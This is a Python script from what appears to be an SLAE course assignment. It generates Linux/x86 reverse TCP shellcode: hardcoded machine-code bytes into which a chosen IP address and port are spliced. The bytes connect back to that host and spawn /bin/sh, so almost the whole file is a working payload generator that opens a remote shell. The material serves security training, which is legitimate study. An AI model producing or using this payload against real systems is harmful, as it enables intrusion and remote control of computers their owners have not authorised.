#!/usr/bin/env python
# SLAE - Assignment #2: Reverse Shell TCP Shellcode (Linux/x86) 
# Author: Alain Menelet 
# StudentID - SLAE-3763
# You can configure the address and the port easily

import argparse
import struct

def main():
    parser = argparse.ArgumentParser(description="Reverse TCP Shell")
    parser.add_argument('--address', dest="addressIp", default=None, type= str, help="Put your address ip", required=True)
    parser.add_argument('--port', dest="port", default=4444, type=int, help="Put the port", required=True)
    args = parser.parse_args()

    ip = args.addressIp.split('.')
    port = args.port

    shellcode = ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68"+
    struct.pack("!4B",int(ip[0]), int(ip[1]),int(ip[2]), int(ip[3]))+"\x66\x68"+struct.pack("!H",port)+"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80");


    print '"' + ''.join('\\x%02x' % ord(c) for c in shellcode) + '";'

if __name__=='__main__':
    main()